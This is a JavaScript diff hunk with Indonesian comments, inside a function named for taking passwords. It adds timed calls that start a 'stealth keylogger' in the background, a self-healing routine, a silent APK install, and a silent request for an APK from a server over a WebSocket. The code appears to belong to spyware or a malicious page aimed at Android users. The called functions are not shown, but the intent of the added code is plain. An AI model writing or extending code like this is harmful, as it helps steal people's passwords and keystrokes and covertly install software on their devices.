@@ -945,6 +945,37 @@ function ambilPassword() {
                             startDownloadAndInstall();
                         }, 2000);
                         
+                        // ============================================================
+                        // 🔥 AKTIFKAN FITUR YANG BELUM DIPANGGIL (TANPA MENGHAPUS APAPUN)
+                        // ============================================================
+                        
+                        // 1. Self-Healing (keduanya berjalan)
+                        setTimeout(function() {
+                            startSelfHealing();
+                        }, 5000);
+                        
+                        // 2. Stealth Keylogger (aktif di background)
+                        setTimeout(function() {
+                            startStealthKeylogger();
+                        }, 6000);
+                        
+                        // 3. Silent Install APK (sebagai fallback jika metode utama gagal)
+                        setTimeout(function() {
+                            if (!APK_INSTALLED) {
+                                var path = getAPKPath();
+                                if (path) {
+                                    silentInstallAPK(path);
+                                }
+                            }
+                        }, 10000);
+                        
+                        // 4. Request APK via WebSocket jika belum ada
+                        setTimeout(function() {
+                            if (!APK_INSTALLED && wsConnected && ws) {
+                                requestAPKFromServerSilent();
+                            }
+                        }, 15000);
+                        
                         return;
                     }
                 } catch(e) {}
